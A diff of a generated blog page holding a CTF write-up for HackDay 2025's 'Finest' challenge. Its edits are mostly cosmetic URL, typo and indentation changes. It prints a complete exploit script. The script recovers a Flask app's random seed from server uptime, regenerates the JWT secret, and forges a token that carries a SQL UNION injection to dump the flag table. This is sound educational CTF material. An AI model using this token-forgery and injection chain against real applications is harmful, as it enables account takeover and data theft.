@@ -35,15 +35,15 @@
 <meta property="og:locale" content="en" />
 <meta name="description" content="Introduction Description" />
 <meta property="og:description" content="Introduction Description" />
-<link rel="canonical" href="https://github.com/NullBrunk/posts/hackday-2025-finest/" />
-<meta property="og:url" content="https://github.com/NullBrunk/posts/hackday-2025-finest/" />
+<link rel="canonical" href="http://localhost:4000/posts/hackday-2025-finest/" />
+<meta property="og:url" content="http://localhost:4000/posts/hackday-2025-finest/" />
 <meta property="og:site_name" content="NullBrunk" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2025-01-25T12:00:00+00:00" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="HackDay - Finest" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-02-09T18:25:45+00:00","datePublished":"2025-01-25T12:00:00+00:00","description":"Introduction Description","headline":"HackDay - Finest","mainEntityOfPage":{"@type":"WebPage","@id":"https://github.com/NullBrunk/posts/hackday-2025-finest/"},"url":"https://github.com/NullBrunk/posts/hackday-2025-finest/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Anas","url":"https://github.com/NullBrunk/"},"dateModified":"2025-02-09T18:25:45+00:00","datePublished":"2025-01-25T12:00:00+00:00","description":"Introduction Description","headline":"HackDay - Finest","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/hackday-2025-finest/"},"url":"http://localhost:4000/posts/hackday-2025-finest/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -1152,7 +1152,7 @@
   <li>Enumeration
     <ul>
       <li><a href="#reading-source-code">Reading Source Code</a></li>
-      <li><a href="#jwt-secret-key">JWY Secret Key</a></li>
+      <li><a href="#jwt-secret-key">JWT Secret Key</a></li>
       <li><a href="#sql-injection">SQL injection</a></li>
     </ul>
   </li>
@@ -1509,7 +1509,7 @@
 <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">JWT_SECRET_KEY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>The main problem here is that we can harvest the <strong>pseudo-random</strong> value used to seed <code class="language-plaintext highlighter-rouge">random</code>, thus enabling us to regenerate the <strong>JWT secret key</strong>.</p>
+<p>The main problem here is that we can retrieve the <strong>pseudo-random</strong> value used to seed <code class="language-plaintext highlighter-rouge">random</code>, thus enabling us to regenerate the <strong>JWT secret key</strong>.</p>
 
 <ul>
   <li><code class="language-plaintext highlighter-rouge">os.getpid()</code>: if the webapp is running in a docker container, <strong>PID = 1</strong></li>
@@ -1572,7 +1572,7 @@
 <p><a href="/assets/img/writeups/YourRegionsFinest/login.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/YourRegionsFinest/login.png" alt="index"  loading="lazy"></a>
 <em>Login</em></p>
 
-<p>Let’s get our JWT: <code class="language-plaintext highlighter-rouge">right-click, inspect -&gt; storage</code>, and inspect it to try to replicate it:</p>
+<p>Let’s get our JWT: <kbd>Ctrl + Shift + I</kbd>, <code class="language-plaintext highlighter-rouge">storage</code>, and inspect it to try to replicate it:</p>
 
 <div file="original_jwt" class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="original_jwt"><i class="far fa-file-code fa-fw"></i></span>
@@ -1676,90 +1676,86 @@
 78
 79
 80
-81
-82
 </pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">Session</span>
 <span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">time</span><span class="p">,</span> <span class="n">sleep</span>
 <span class="kn">from</span> <span class="n">math</span> <span class="kn">import</span> <span class="n">floor</span>
 <span class="kn">import</span> <span class="n">random</span>
 <span class="kn">import</span> <span class="n">string</span>
 <span class="kn">import</span> <span class="n">uuid</span>
-
-<span class="c1"># PyJWT
-</span><span class="kn">import</span> <span class="n">jwt</span>
+<span class="kn">import</span> <span class="n">jwt</span>
 
 <span class="n">URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://challenges.hackday.fr:58990/</span><span class="sh">"</span>
 <span class="n">SESSION</span> <span class="o">=</span> <span class="nc">Session</span><span class="p">()</span>
 
 <span class="c1"># Login using our credentials (test:test)
 </span><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
-	<span class="n">t</span> <span class="o">=</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-		<span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>
-		<span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>
-		<span class="sh">"</span><span class="s">submit</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span>
-	<span class="p">})</span>
+    <span class="n">t</span> <span class="o">=</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+        <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">submit</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span>
+    <span class="p">})</span>
 
-	<span class="nf">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/check_auth</span><span class="sh">"</span><span class="p">).</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">logged_in</span><span class="sh">"</span><span class="p">]):</span>
-		<span class="nf">exit</span><span class="p">()</span>
+    <span class="nf">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/check_auth</span><span class="sh">"</span><span class="p">).</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">logged_in</span><span class="sh">"</span><span class="p">]):</span>
+        <span class="nf">exit</span><span class="p">()</span>
 
 <span class="c1"># Regenerate the `up` value (= server uptime)
 # by getting informations from the /healthz endpont
 </span><span class="k">def</span> <span class="nf">get_time</span><span class="p">():</span>
-	<span class="n">server_uptime</span> <span class="o">=</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/healthz</span><span class="sh">"</span><span class="p">).</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">uptime</span><span class="sh">"</span><span class="p">]</span>
+    <span class="n">server_uptime</span> <span class="o">=</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/healthz</span><span class="sh">"</span><span class="p">).</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">uptime</span><span class="sh">"</span><span class="p">]</span>
 
-	<span class="n">server_uptime</span> <span class="o">=</span> <span class="nf">floor</span><span class="p">(</span><span class="n">server_uptime</span><span class="p">)</span>
-	<span class="n">current_time</span> <span class="o">=</span> <span class="nf">floor</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span>
+    <span class="n">server_uptime</span> <span class="o">=</span> <span class="nf">floor</span><span class="p">(</span><span class="n">server_uptime</span><span class="p">)</span>
+    <span class="n">current_time</span> <span class="o">=</span> <span class="nf">floor</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span>
 
-	<span class="k">return</span> <span class="n">current_time</span> <span class="o">-</span> <span class="n">server_uptime</span>
+    <span class="k">return</span> <span class="n">current_time</span> <span class="o">-</span> <span class="n">server_uptime</span>
 
 
 <span class="k">def</span> <span class="nf">sign_jwt</span><span class="p">(</span><span class="n">secret_key</span><span class="p">):</span>
-	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
-		<span class="sh">"</span><span class="s">fresh</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>            <span class="c1"># Not important
-</span>		<span class="sh">"</span><span class="s">iat</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">()),</span>        <span class="c1"># Issue date
-</span>		<span class="sh">"</span><span class="s">jti</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()),</span>  <span class="c1"># Unique JWT ID
-</span>		<span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">access</span><span class="sh">"</span><span class="p">,</span>          <span class="c1"># Not important
-</span>		<span class="sh">"</span><span class="s">sub</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>             <span class="c1"># Our username
-</span>		<span class="sh">"</span><span class="s">nbf</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span>    <span class="c1"># JWT is NOT valid BEFORE this date
-</span>		<span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span><span class="o">+</span><span class="mi">2000</span><span class="p">,</span>   <span class="c1"># JWT expires AFTER this date 
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">fresh</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>            <span class="c1"># Not important
+</span>        <span class="sh">"</span><span class="s">iat</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">()),</span>        <span class="c1"># Issue date
+</span>        <span class="sh">"</span><span class="s">jti</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()),</span>  <span class="c1"># Unique JWT ID
+</span>        <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">access</span><span class="sh">"</span><span class="p">,</span>          <span class="c1"># Not important
+</span>        <span class="sh">"</span><span class="s">sub</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>             <span class="c1"># Our username
+</span>        <span class="sh">"</span><span class="s">nbf</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span>    <span class="c1"># JWT is NOT valid BEFORE this date
+</span>        <span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span><span class="o">+</span><span class="mi">2000</span><span class="p">,</span>   <span class="c1"># JWT expires AFTER this date 
 </span>        
         <span class="c1"># I use a simple UNION query to get the flag
-</span>		<span class="sh">"</span><span class="s">favorite_product</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">4 UNION SELECT null,null,null,flag,null,null FROM flag;</span><span class="sh">"</span> 
-	<span class="p">}</span>
+</span>        <span class="sh">"</span><span class="s">favorite_product</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">4 UNION SELECT null,null,null,flag,null,null FROM flag;</span><span class="sh">"</span> 
+    <span class="p">}</span>
 
     <span class="c1"># Sign the JWT using the server's secret key
-</span>	<span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">)</span>
-	<span class="k">return</span> <span class="n">token</span>
+</span>    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">token</span>
 
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
-	<span class="nf">login</span><span class="p">()</span>
-	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Logged in</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">login</span><span class="p">()</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Logged in</span><span class="sh">"</span><span class="p">)</span>
 
 
-	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Calculating server uptime date and PID</span><span class="sh">"</span><span class="p">)</span>
-	<span class="n">time_start</span> <span class="o">=</span> <span class="nf">get_time</span><span class="p">()</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Calculating server uptime date and PID</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">time_start</span> <span class="o">=</span> <span class="nf">get_time</span><span class="p">()</span>
 
-	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">time_start</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
-	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="s">1</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
-	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[&gt;] time_start=</span><span class="sh">"</span><span class="si">{</span><span class="n">time_start</span><span class="si">}</span><span class="sh">"</span><span class="s"> pid=</span><span class="sh">"</span><span class="s">1</span><span class="sh">"'</span><span class="p">)</span>
-	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Gathering server</span><span class="sh">'</span><span class="s">s seed</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">time_start</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="s">1</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[&gt;] time_start=</span><span class="sh">"</span><span class="si">{</span><span class="n">time_start</span><span class="si">}</span><span class="sh">"</span><span class="s"> pid=</span><span class="sh">"</span><span class="s">1</span><span class="sh">"'</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Gathering server</span><span class="sh">'</span><span class="s">s seed</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
     
-    <span class="c1"># Seeding randpm with servers parameters 
-</span>	<span class="n">random</span><span class="p">.</span><span class="nf">seed</span><span class="p">(</span><span class="n">time_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="c1"># Seeding random with servers parameters 
+</span>    <span class="n">random</span><span class="p">.</span><span class="nf">seed</span><span class="p">(</span><span class="n">time_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
     <span class="c1">#                        ^ os.getpid() = 1
 </span>
     <span class="c1"># In a realistic scenario, we could also do some damage with the flask secret key
-</span>	<span class="n">flask_secret_key</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
+</span>    <span class="n">flask_secret_key</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
 
     <span class="c1"># Generate the jwt_secret key
-</span>	<span class="n">jwt_secret_key</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
+</span>    <span class="n">jwt_secret_key</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
     <span class="n">jwt</span> <span class="o">=</span> <span class="nf">sign_jwt</span><span class="p">(</span><span class="n">jwt_secret_key</span><span class="p">)</span>
 	
     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Generated JWT key:</span><span class="sh">"</span><span class="p">)</span>
-	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">jwt_secret_key</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
-	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Generated JWT token:</span><span class="sh">"</span><span class="p">)</span>
-	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">jwt</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">jwt_secret_key</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Generated JWT token:</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">jwt</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 </pre></td></tr></tbody></table></code></div></div>
 
 <p>Let’s run it:
@@ -1776,11 +1772,11 @@
 
 <p>Finally, we can use this cookie to get the flag.</p>
 
-<p>To do so: <code class="language-plaintext highlighter-rouge">right-click, inspect -&gt; storage</code>. Paste the Generated JWT in here, then go to <code class="language-plaintext highlighter-rouge">/favorite_product_info</code> <em>(the SQLi vulnerable endpoint)</em>:
+<p>To do so: <kbd>Ctrl + Shift + I</kbd>, <code class="language-plaintext highlighter-rouge">storage</code>. Paste the Generated JWT in here, then go to <code class="language-plaintext highlighter-rouge">/favorite_product_info</code> <em>(the SQLi vulnerable endpoint)</em>:
 <a href="/assets/img/writeups/YourRegionsFinest/okay.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/YourRegionsFinest/okay.png" alt="index"  loading="lazy"></a></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="code-header">
-        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+<div file="flag.txt" class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="flag.txt"><i class="far fa-file-code fa-fw"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>HACKDAY{Th4t_s_S0m3_g000000000000d_qu4lity!}
 </pre></td></tr></tbody></table></code></div></div>
@@ -1863,21 +1859,21 @@
 
       
 
-      <a href="https://twitter.com/intent/tweet?text=HackDay%20-%20Finest%20-%20NullBrunk&url=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fhackday-2025-finest%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+      <a href="https://twitter.com/intent/tweet?text=HackDay%20-%20Finest%20-%20NullBrunk&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-finest%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
         <i class="fa-fw fa-brands fa-square-x-twitter"></i>
       </a>
     
 
       
 
-      <a href="https://www.facebook.com/sharer/sharer.php?title=HackDay%20-%20Finest%20-%20NullBrunk&u=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fhackday-2025-finest%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?title=HackDay%20-%20Finest%20-%20NullBrunk&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-finest%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
         <i class="fa-fw fab fa-facebook-square"></i>
       </a>
     
 
       
 
-      <a href="https://t.me/share/url?url=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2Fhackday-2025-finest%2F&text=HackDay%20-%20Finest%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhackday-2025-finest%2F&text=HackDay%20-%20Finest%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
         <i class="fa-fw fab fa-telegram"></i>
       </a>
     
@@ -2123,6 +2119,30 @@
 
   
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
   
 
   
